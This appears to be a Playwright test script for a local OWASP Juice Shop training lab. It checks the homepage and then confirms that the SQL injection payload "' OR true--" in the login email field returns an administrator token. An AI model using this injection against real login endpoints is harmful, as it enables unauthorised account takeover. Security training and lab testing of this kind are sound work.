import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";

const require = createRequire(import.meta.url);
const projectDir = path.dirname(fileURLToPath(import.meta.url));
const playwrightPath = path.join(projectDir, ".browser-node", "node_modules", "playwright");
assert.ok(fs.existsSync(playwrightPath), "Playwright is not installed in _PROJECT/.browser-node");
const { chromium } = require(playwrightPath);

const baseUrl = process.env.JUICE_SHOP_URL || "http://127.0.0.1:3000";
const browser = await chromium.launch({ headless: true });
const context = await browser.newContext();

try {
  const page = await context.newPage();
  const response = await page.goto(baseUrl, { waitUntil: "domcontentloaded", timeout: 20_000 });
  assert.equal(response?.status(), 200, "Juice Shop homepage must return HTTP 200");
  await page.waitForSelector("app-root", { state: "attached", timeout: 20_000 });

  const login = await context.request.post(`${baseUrl}/rest/user/login`, {
    data: { email: "' OR true--", password: "training-only" },
  });
  assert.equal(login.status(), 200, "The pinned teaching payload must reach the expected success state");
  const body = await login.json();
  assert.ok(body?.authentication?.token, "The response must contain an authentication context");
  assert.equal(body?.authentication?.umail, "admin@juice-sh.op", "The context must be the built-in Juice Shop administrator");

  process.stdout.write("JUICE SHOP DEMO OK — homepage 200; local SQLi changed context; token not printed\n");
} finally {
  await context.close();
  await browser.close();
}
